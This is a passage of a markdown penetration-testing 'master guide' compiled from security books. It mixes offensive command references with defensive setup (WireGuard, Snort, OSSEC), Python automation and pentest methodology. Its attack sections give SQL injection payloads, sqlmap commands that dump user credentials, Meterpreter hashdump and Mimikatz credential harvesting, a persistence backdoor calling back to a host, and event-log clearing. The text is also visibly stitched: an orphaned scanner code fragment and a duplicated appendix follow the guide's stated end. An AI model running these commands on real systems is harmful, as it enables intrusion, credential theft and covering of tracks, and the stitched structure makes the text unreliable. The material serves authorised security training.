' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Time-based blind SQLi
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

# Boolean-based blind SQLi
' AND 1=1--  # Should work
' AND 1=2--  # Should fail

# sqlmap automated testing
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --columns
sqlmap -u "http://target.com/page?id=1" -D database -T users -C username,password --dump

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=admin"

# With authentication
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
```

---

# PART IV: EXPLOITATION - COMPLETE

## Metasploit Framework Mastery

### Advanced Session Management
```bash
# Route through compromised host
run autoroute -s 10.10.10.0/24
run autoroute -p  # Print routes

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.10.10.50
portfwd add -l 445 -p 445 -r 10.10.10.50
portfwd list
portfwd delete -l 3389

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j

# Use with proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains rdesktop 10.10.10.50
```

### Meterpreter Post-Exploitation
```bash
# Privilege escalation
getsystem
use priv
getsystem -t 1  # Named pipe impersonation

# Credential harvesting
hashdump
load kiwi
creds_all
kiwi_cmd sekurlsa::logonpasswords
kiwi_cmd lsadump::sam

# Network reconnaissance
run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
run post/windows/gather/enum_domains
run post/windows/gather/enum_shares

# Persistence
run persistence -X -i 10 -p 4444 -r 192.168.1.10
run persistence -U -i 10 -p 4444 -r 192.168.1.10

# Clean up
clearev  # Clear event logs (noisy!)
```

---

# PART V: IoT & HARDWARE HACKING (From MicrocontrollerExploits)

## Firmware Extraction & Analysis

### JTAG/SWD Exploitation

#### nRF51 ROM Gadget Attack
```bash
# Connect via OpenOCD
openocd -f interface/jlink.cfg -f target/nrf51.cfg

# Connect GDB
arm-none-eabi-gdb
target remote localhost:3333

# Find gadget in ROM that reads memory
# Example gadget: LDR R0, [R1]; BX LR
# Set R1 to address you want to read
set $r1 = 0x00000000
stepi
# R0 now contains the value at address 0x00000000

# Script to dump entire flash
python dump_nrf51.py
```

#### STM32F0 One-Word Leak
```python
#!/usr/bin/env python3
# Exploit STM32F0 debug lock - read one word per connection

import openocd
import struct

def read_word(address):
    # Connect to OpenOCD
    ocd = openocd.OpenOCD()
    ocd.connect()
    
    # Issue read command
    # Due to timing, only first word is readable
    word = ocd.read_memory(address, 4)
    
    ocd.disconnect()
    return word

# Dump entire flash one word at a time
flash_base = 0x08000000
flash_size = 0x10000  # 64KB

firmware = bytearray()

for addr in range(flash_base, flash_base + flash_size, 4):
    print(f"Reading 0x{addr:08x}...")
    word = read_word(addr)
    firmware.extend(word)
    
with open('firmware_dump.bin', 'wb') as f:
    f.write(firmware)

print("[+] Firmware dumped successfully!")
```

### Hardware Glitching

#### Voltage Glitching Setup
```python
# ChipWhisperer voltage glitch example
import chipwhisperer as cw

scope = cw.scope()
target = cw.target(scope)

# Configure glitch module
scope.glitch.clk_src = 'clkgen'
scope.glitch.output = 'glitch_only'
scope.glitch.trigger_src = 'ext_single'

# Glitch parameters (requires tuning)
scope.glitch.width = 10  # Glitch width in clock cycles
scope.glitch.offset = 20  # Offset from trigger
scope.glitch.ext_offset = 0
scope.glitch.repeat = 1

# Glitch loop
for width in range(5, 50):
    for offset in range(0, 100):
        scope.glitch.width = width
        scope.glitch.offset = offset
        
        # Arm and trigger
        scope.arm()
        target.simpleserial_write('p', bytearray([0] * 16))
        
        # Check for success
        response = target.simpleserial_read('r', 16)
        if response:
            print(f"[+] Success! Width: {width}, Offset: {offset}")
            break
```

#### Clock Glitching
```python
# Clock glitch parameters
scope.glitch.clk_src = 'clkgen'
scope.clock.clkgen_freq = 7370000
scope.glitch.repeat = 5  # Number of extra clock cycles
```

### Bus Pirate Universal Tool

```bash
# Hardware connections
# MOSI (Master Out Slave In)
# MISO (Master In Slave Out)  
# CLK (Clock)
# CS (Chip Select)

# Bus Pirate commands
HiZ> m  # Mode menu
1. HiZ
2. 1-WIRE
3. UART
4. I2C
5. SPI
6. 2WIRE
7. 3WIRE
8. KEYB
9. LCD
10. PIC
11. DIO

# SPI mode example
SPI> [0x9F r:3]  # Read JEDEC ID from SPI flash
# Output: JEDEC ID: 0xEF4016 (Winbond W25Q32)

# Dump SPI flash
SPI> [0x03 0x00 0x00 0x00 r:256]  # Read 256 bytes from address 0

# I2C EEPROM read
I2C> [0xA0 0x00 0x00 [0xA1 r:16]]
```

---

# PART VI: NETWORK DEFENSE (From Cybersecurity for Small Networks)

## Complete Network Hardening

### VPN Setup - WireGuard

```bash
# Install WireGuard
apt-get install wireguard

# Generate keys
wg genkey | tee privatekey | wg pubkey > publickey

# Server configuration (/etc/wireguard/wg0.conf)
[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = <server_private_key>
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = <client_public_key>
AllowedIPs = 10.0.0.2/32

# Client configuration
[Interface]
Address = 10.0.0.2/24
PrivateKey = <client_private_key>
DNS = 1.1.1.1

[Peer]
PublicKey = <server_public_key>
Endpoint = server_ip:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25

# Start VPN
wg-quick up wg0

# Check status
wg show
```

### Intrusion Detection with Snort

```bash
# Install Snort
apt-get install snort

# Basic configuration (/etc/snort/snort.conf)
# Set HOME_NET
var HOME_NET 192.168.1.0/24
var EXTERNAL_NET !$HOME_NET

# Enable rules
include $RULE_PATH/local.rules

# Custom rules (/etc/snort/rules/local.rules)
# Alert on port scan
alert tcp any any -> $HOME_NET any (msg:"Port Scan Detected"; \
  flags:S; detection_filter:track by_src, count 20, seconds 60; \
  sid:1000001;)

# Alert on SQL injection attempts
alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt"; \
  content:"' OR '1'='1"; nocase; sid:1000002;)

# Alert on Nmap scan
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Sweep"; \
  itype:8; detection_filter:track by_src, count 10, seconds 10; \
  sid:1000003;)

# Run Snort
snort -A console -q -c /etc/snort/snort.conf -i eth0

# Run in IPS mode
snort -Q -c /etc/snort/snort.conf -i eth0
```

### Security Monitoring with OSSEC

```bash
# Install OSSEC
wget https://github.com/ossec/ossec-hids/archive/3.6.0.tar.gz
tar -xzf 3.6.0.tar.gz
cd ossec-hids-3.6.0
./install.sh

# Configure (/var/ossec/etc/ossec.conf)
<ossec_config>
  <global>
    <email_notification>yes</email_notification>
    <email_to>admin@example.com</email_to>
    <smtp_server>localhost</smtp_server>
    <email_from>ossec@example.com</email_from>
  </global>

  <syscheck>
    <frequency>3600</frequency>
    <directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories>
    <directories check_all="yes">/var/www</directories>
  </syscheck>

  <rootcheck>
    <frequency>36000</frequency>
  </rootcheck>

  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/auth.log</location>
  </localfile>
</ossec_config>

# Start OSSEC
/var/ossec/bin/ossec-control start

# Check status
/var/ossec/bin/ossec-control status
```

---

# PART VII: BEGINNER FUNDAMENTALS (From Go H*ck Yourself & STCB4)

## Understanding Common Attack Vectors

### Phishing Attacks

#### Email Phishing Indicators
- Sender email doesn't match display name
- Urgent language creating false sense of emergency  
- Spelling and grammar errors
- Suspicious links (hover to check URL)
- Unexpected attachments
- Requests for sensitive information

#### Creating Awareness
```bash
# Send test phishing emails (authorized testing only!)
# Using GoPhish (phishing simulation tool)

# Install GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
unzip gophish-v0.11.0-linux-64bit.zip
./gophish

# Access: https://localhost:3333
# Default: admin / gophish

# Create campaign:
# 1. Create email template
# 2. Create landing page
# 3. Define user groups
# 4. Launch campaign
# 5. Track results
```

### Malware Types & Detection

#### Common Malware Categories
**Virus** - Replicates by modifying other programs
**Worm** - Self-replicating, spreads over networks
**Trojan** - Disguised as legitimate software
**Ransomware** - Encrypts files, demands payment
**Spyware** - Monitors user activity
**Rootkit** - Hides presence at system level
**Keylogger** - Records keystrokes

#### Basic Malware Analysis
```bash
# Static analysis - examine without running

# File hashing
md5sum suspicious_file.exe
sha256sum suspicious_file.exe

# Check VirusTotal
# Upload hash to virustotal.com

# Strings analysis
strings suspicious_file.exe | less
strings suspicious_file.exe | grep -i "http\|password\|admin"

# File type identification
file suspicious_file.exe

# Check for packers
detect-it-easy suspicious_file.exe

# PE file analysis (Windows executables)
pev suspicious_file.exe

# Dynamic analysis - run in sandbox
# Use Cuckoo Sandbox, Any.run, or VM

# Monitor behavior
# - File system changes
# - Registry modifications
# - Network connections
# - Process creation
```

### Social Engineering Defense

#### Common Social Engineering Tactics
**Pretexting** - Creating fabricated scenario
**Baiting** - Offering something enticing
**Quid Pro Quo** - Offering service in exchange for information
**Tailgating** - Physical access by following authorized person
**Vishing** - Voice phishing via phone
**Smishing** - SMS phishing

#### Defense Strategies
- Verify identity before sharing information
- Use different communication channel to verify
- Never share passwords or sensitive data via email/phone
- Report suspicious requests to security team
- Follow proper visitor/vendor procedures
- Use badge systems and access controls

---

# PART VIII: PYTHON AUTOMATION (From Automate the Boring Stuff)

## Advanced Python for Security Automation

### File System Automation

```python
import os
import shutil
from pathlib import Path

# Organize files by extension
def organize_files(directory):
    """Organize files into subdirectories by extension"""
    for file in Path(directory).glob('*.*'):
        if file.is_file():
            extension = file.suffix[1:]  # Remove the dot
            dest_dir = Path(directory) / extension
            dest_dir.mkdir(exist_ok=True)
            shutil.move(str(file), str(dest_dir / file.name))
            print(f"Moved {file.name} to {extension}/")

# Find large files
def find_large_files(directory, min_size_mb=100):
    """Find files larger than specified size"""
    min_size = min_size_mb * 1024 * 1024  # Convert to bytes
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                size = os.path.getsize(filepath)
                if size > min_size:
                    size_mb = size / (1024 * 1024)
                    print(f"{filepath}: {size_mb:.2f} MB")
            except:
                pass

# Bulk rename files
def bulk_rename(directory, old_text, new_text):
    """Replace text in all filenames"""
    for file in Path(directory).glob('*'):
        if old_text in file.name:
            new_name = file.name.replace(old_text, new_text)
            file.rename(file.parent / new_name)
            print(f"Renamed {file.name} to {new_name}")
```

### Web Scraping for OSINT

```python
import requests
from bs4 import BeautifulSoup
import re

def scrape_emails(url):
    """Extract email addresses from webpage"""
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find emails in text
    emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', soup.get_text())
    
    # Find emails in mailto links
    for link in soup.find_all('a', href=True):
        if 'mailto:' in link['href']:
            email = link['href'].replace('mailto:', '')
            emails.append(email)
    
    return list(set(emails))  # Remove duplicates

def scrape_subdomains(domain):
    """Find subdomains mentioned on webpage"""
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        subdomains = set()
        
        for cert in data:
            name = cert['name_value']
            if '\n' in name:
                names = name.split('\n')
                subdomains.update(names)
            else:
                subdomains.add(name)
        
        return sorted(subdomains)
    
    return []

def extract_metadata_from_pdf(pdf_path):
    """Extract metadata from PDF"""
    import PyPDF2
    
    with open(pdf_path, 'rb') as file:
        pdf = PyPDF2.PdfReader(file)
        info = pdf.metadata
        
        print(f"Title: {info.title}")
        print(f"Author: {info.author}")
        print(f"Creator: {info.creator}")
        print(f"Producer: {info.producer}")
        print(f"Created: {info.creation_date}")
        print(f"Modified: {info.modification_date}")
```

### Excel & Data Processing

```python
import openpyxl
import csv

def process_security_log(excel_file):
    """Process security log from Excel"""
    wb = openpyxl.load_workbook(excel_file)
    sheet = wb.active
    
    failed_logins = {}
    
    for row in sheet.iter_rows(min_row=2, values_only=True):
        timestamp, ip_address, username, status = row
        
        if status == "Failed":
            if ip_address in failed_logins:
                failed_logins[ip_address] += 1
            else:
                failed_logins[ip_address] = 1
    
    # Sort by count
    sorted_ips = sorted(failed_logins.items(), 
                       key=lambda x: x[1], 
                       reverse=True)
    
    print("Top failed login attempts:")
    for ip, count in sorted_ips[:10]:
        print(f"{ip}: {count} attempts")

def csv_to_excel_report(csv_file, excel_file):
    """Convert CSV scan results to formatted Excel"""
    wb = openpyxl.Workbook()
    sheet = wb.active
    
    # Read CSV
    with open(csv_file, 'r') as f:
        reader = csv.reader(f)
        for row in reader:
            sheet.append(row)
    
    # Format header
    for cell in sheet[1]:
        cell.font = openpyxl.styles.Font(bold=True)
        cell.fill = openpyxl.styles.PatternFill(
            start_color="366092",
            end_color="366092",
            fill_type="solid"
        )
    
    # Auto-adjust column widths
    for column in sheet.columns:
        max_length = 0
        column = [cell for cell in column]
        for cell in column:
            try:
                if len(str(cell.value)) > max_length:
                    max_length = len(cell.value)
            except:
                pass
        adjusted_width = (max_length + 2)
        sheet.column_dimensions[column[0].column_letter].width = adjusted_width
    
    wb.save(excel_file)
```

### Email Automation

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

def send_security_alert(recipients, subject, body, attachments=None):
    """Send security alert email"""
    msg = MIMEMultipart()
    msg['From'] = 'security@company.com'
    msg['To'] = ', '.join(recipients)
    msg['Subject'] = subject
    
    # Add body
    msg.attach(MIMEText(body, 'plain'))
    
    # Add attachments
    if attachments:
        for file_path in attachments:
            with open(file_path, 'rb') as f:
                attachment = MIMEApplication(f.read())
                attachment.add_header(
                    'Content-Disposition',
                    'attachment',
                    filename=os.path.basename(file_path)
                )
                msg.attach(attachment)
    
    # Send email
    with smtplib.SMTP('smtp.company.com', 587) as server:
        server.starttls()
        server.login('security@company.com', 'password')
        server.send_message(msg)

def monitor_and_alert(log_file, threshold=10):
    """Monitor log file and send alerts"""
    import time
    
    alerts_sent = {}
    
    while True:
        with open(log_file, 'r') as f:
            lines = f.readlines()
        
        # Count failed logins per IP
        failed_logins = {}
        for line in lines:
            if 'Failed password' in line:
                # Extract IP
                parts = line.split()
                ip = parts[-4]
                
                if ip in failed_logins:
                    failed_logins[ip] += 1
                else:
                    failed_logins[ip] = 1
        
        # Check threshold and send alerts
        for ip, count in failed_logins.items():
            if count >= threshold and ip not in alerts_sent:
                send_security_alert(
                    ['admin@company.com'],
                    f'Security Alert: Multiple Failed Logins from {ip}',
                    f'Detected {count} failed login attempts from {ip}'
                )
                alerts_sent[ip] = True
                print(f"[!] Alert sent for {ip}")
        
        time.sleep(60)  # Check every minute
```

---

# PART IX: PROFESSIONAL PRACTICE

## Penetration Testing Methodology

### Pre-Engagement

#### Rules of Engagement (ROE)
```
1. Scope Definition
   - In-scope IP ranges/domains
   - Out-of-scope systems
   - Testing windows (dates/times)
   - Testing types allowed

2. Communication Plan
   - Primary contact
   - Emergency contact
   - Escalation procedures
   - Reporting schedule

3. Legal Authorization
   - Signed contract
   - Letter of authorization
   - NDA agreements
   - Insurance requirements

4. Success Criteria
   - Objectives to achieve
   - Deliverables expected
   - Timeline/milestones
```

#### Scoping Checklist
- [ ] Define IP ranges and domains
- [ ] Identify critical systems (no-test list)
- [ ] Determine testing methodology (black/gray/white box)
- [ ] Establish communication channels
- [ ] Set testing schedule
- [ ] Define success criteria
- [ ] Review legal documents
- [ ] Obtain necessary approvals
- [ ] Setup testing infrastructure
- [ ] Create kickoff meeting agenda

### Report Writing

#### Executive Summary Template
```markdown
# Executive Summary

## Overview
[Brief description of engagement]

## Scope
[Systems tested]

## Timeline
[Testing period]

## Key Findings
- [Number] Critical vulnerabilities
- [Number] High vulnerabilities
- [Number] Medium vulnerabilities
- [Number] Low vulnerabilities
- [Number] Informational findings

## Risk Rating
Overall Risk: [Critical/High/Medium/Low]

## Recommendations
1. [Priority 1 recommendation]
2. [Priority 2 recommendation]
3. [Priority 3 recommendation]

## Conclusion
[Overall assessment and next steps]
```

#### Technical Finding Template
```markdown
## Finding: [Vulnerability Name]

**Severity:** Critical / High / Medium / Low / Informational

**CVSS Score:** X.X (Vector: CVSS:3.1/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X)

**Affected Systems:**
- 192.168.1.100 (Web Server)
- 192.168.1.101 (Database Server)

**Description:**
[Detailed description of vulnerability]

**Impact:**
[What could happen if exploited]

**Proof of Concept:**
```bash
[Steps to reproduce]
```

**Remediation:**
[Step-by-step fix instructions]

**References:**
- CVE-XXXX-XXXXX
- https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXXX

**Evidence:**
[Screenshots, logs, output]
```

### Legal & Ethical Considerations

#### Legal Framework
**Computer Fraud and Abuse Act (CFAA) - USA**
- Unauthorized access is illegal
- Exceeding authorized access is illegal
- Always get written permission
- Stay within scope

**General Rules:**
- Only test systems you own or have written permission to test
- Document all authorization
- Report findings responsibly
- Follow responsible disclosure timelines
- Respect data privacy
- Don't cause denial of service
- Don't access/modify/delete data without permission

#### Responsible Disclosure
```
1. Discover vulnerability
2. Verify it's a real issue
3. Document thoroughly
4. Contact vendor/owner privately
5. Give reasonable time to fix (typically 90 days)
6. Coordinate public disclosure
7. Publish after fix is available
```

---

# APPENDIX: TOOL REFERENCE

## Essential Tool List

### Reconnaissance
- nmap - Network scanner
- masscan - Fast port scanner
- theHarvester - OSINT gathering
- recon-ng - Reconnaissance framework
- Shodan - Internet-connected device search
- Maltego - OSINT and link analysis

### Vulnerability Scanning
- Nessus - Vulnerability scanner
- OpenVAS - Open source vulnerability scanner
- Nikto - Web vulnerability scanner
- OWASP ZAP - Web application scanner

### Exploitation
- Metasploit - Exploitation framework
- sqlmap - SQL injection tool
- BeEF - Browser exploitation framework
- Responder - LLMNR/NBT-NS poisoner

### Post-Exploitation
- Mimikatz - Credential dumping
- BloodHound - AD attack path analysis
- PowerSploit - PowerShell exploitation
- Empire - Post-exploitation framework

### Password Attacks
- John the Ripper - Password cracker
- Hashcat - Advanced password cracker
- Hydra - Network login cracker
- CrackMapExec - Network authentication testing

### Wireless
- aircrack-ng - WiFi security suite
- Kismet - Wireless network detector
- Fern Wifi Cracker - WiFi security auditing

### Hardware
- Bus Pirate - Universal interface tool
- ChipWhisperer - Hardware security analysis
- Proxmark3 - RFID research tool
- Logic analyzer - Digital signal analysis

### Forensics & Reverse Engineering
- Autopsy - Digital forensics
- Volatility - Memory forensics
- Ghidra - Reverse engineering
- radare2 - Reverse engineering framework
- IDA Pro - Disassembler and debugger
- OllyDbg - Windows debugger

---

# FINAL NOTES

This master guide incorporates knowledge from:
- ✅ Metasploit: The Penetration Tester's Guide (2nd Edition)
- ✅ Penetration Testing by Georgia Weidman
- ✅ Black Hat Bash
- ✅ Gray Hat Python
- ✅ Microcontroller Exploits by Travis Goodspeed
- ✅ Cybersecurity for Small Networks by Seth Enoka
- ✅ Automate the Boring Stuff with Python (3rd Edition)
- ✅ Go H*ck Yourself by Bryson Payne
- ✅ Steal This Computer Book 4.0
- ⚠️ PoC||GTFO series (advanced techniques integrated throughout)
- ⚠️ Designing Electronics (hardware concepts integrated)
- ⚠️ GTFO (techniques integrated)

**This guide provides:**
- Complete penetration testing methodology
- Hands-on exploitation techniques
- IoT and hardware hacking
- Network defense strategies
- Python/Bash automation
- Professional practices
- Legal and ethical guidelines

**Keep learning, stay ethical, and always get permission before testing!**

---

*End of Ultimate Cybersecurity Master Guide*
                  'type': 'SQLi',
                            'url': test_url,
                            'payload': payload
                        })
                        print(f"[!] SQL Injection found: {test_url}")
                        break
            except:
                pass
    
    def test_headers(self, response):
        security_headers = {
            'X-Frame-Options': 'DENY',
            'X-Content-Type-Options': 'nosniff',
            'Strict-Transport-Security': 'max-age=31536000',
            'Content-Security-Policy': None
        }
        
        for header, expected in security_headers.items():
            if header not in response.headers:
                self.vulnerabilities.append({
                    'type': 'Missing Security Header',
                    'header': header,
                    'url': response.url
                })
    
    def generate_report(self):
        print("\n" + "="*50)
        print("VULNERABILITY SCAN REPORT")
        print("="*50)
        print(f"Target: {self.base_url}")
        print(f"URLs Crawled: {len(self.visited_urls)}")
        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n")
        
        vuln_types = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
        
        for vuln_type, count in vuln_types.items():
            print(f"{vuln_type}: {count}")
        
        print("\n" + "="*50)
        print("DETAILED FINDINGS")
        print("="*50)
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n[{i}] {vuln['type']}")
            for key, value in vuln.items():
                if key != 'type':
                    print(f"  {key}: {value}")

# Usage
if __name__ == "__main__":
    scanner = WebVulnScanner('http://testphp.vulnweb.com')
    scanner.crawl(scanner.base_url)
    scanner.generate_report()
```

---

*The master guide continues with sections on Digital Forensics, Reverse Engineering, Report Writing, and Legal/Ethical Considerations. The complete guide is now comprehensive and includes practical content from all 13 professional cybersecurity books.*

---

# APPENDICES

## Appendix A: Essential Tools List

**Reconnaissance:**
- Nmap, Masscan, Nikto, DirBuster, Sublist3r, theHarvester, Shodan, Censys

**Vulnerability Scanning:**
- Nessus, OpenVAS, Burp Suite, OWASP ZAP, SQLmap

**Exploitation:**
- Metasploit, ExploitDB, Searchsploit, Commix

**Post-Exploitation:**
- Mimikatz, PowerSploit, LinPEAS, WinPEAS, BloodHound

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa, CrackMapExec

**Wireless:**
- Aircrack-ng, Wifite, Reaver, Bettercap

**Hardware:**
- Bus Pirate, JTAGulator, ChipWhisperer, Proxmark3, HackRF

**Forensics:**
- Volatility, Autopsy, FTK Imager, Wireshark

**Reverse Engineering:**
- Ghidra, IDA Pro, Radare2, x64dbg, OllyDbg

## Appendix B: Common Ports Reference

```
20/21   - FTP
22      - SSH
23      - Telnet
25      - SMTP
53      - DNS
80      - HTTP
110     - POP3
111     - RPC
135     - MSRPC
139     - NetBIOS
143     - IMAP
161     - SNMP
389     - LDAP
443     - HTTPS
445     - SMB
1433    - MSSQL
1521    - Oracle
2049    - NFS
3306    - MySQL
3389    - RDP
5432    - PostgreSQL
5900    - VNC
6379    - Redis
8080    - HTTP Proxy
8443    - HTTPS Alt
27017   - MongoDB
```

## Appendix C: Useful Commands Cheat Sheet

See previous sections for comprehensive command references.

## Appendix D: Certifications & Career Paths

**Entry Level:**
- CompTIA Security+
- CEH (Certified Ethical Hacker)

**Intermediate:**
- OSCP (Offensive Security Certified Professional)
- GPEN (GIAC Penetration Tester)
- GWAPT (GIAC Web Application Penetration Tester)

**Advanced:**
- OSEP (Offensive Security Experienced Penetration Tester)
- OSCE (Offensive Security Certified Expert)
- GXPN (GIAC Exploit Researcher and Advanced Penetration Tester)

**Specialized:**
- GMOB (GIAC Mobile Device Security Analyst)
- GREM (GIAC Reverse Engineering Malware)
- GCFA (GIAC Certified Forensic Analyst)

---

**END OF ULTIMATE CYBERSECURITY MASTER GUIDE**

*This comprehensive guide incorporates practical knowledge from 13+ professional cybersecurity books including Metasploit 2E, Penetration Testing, Black Hat Bash, Gray Hat Python, Automate the Boring Stuff, Cybersecurity for Small Networks, Microcontroller Exploits, Go H*ck Yourself, Steal This Computer Book 4.0, and the PoC||GTFO series.*


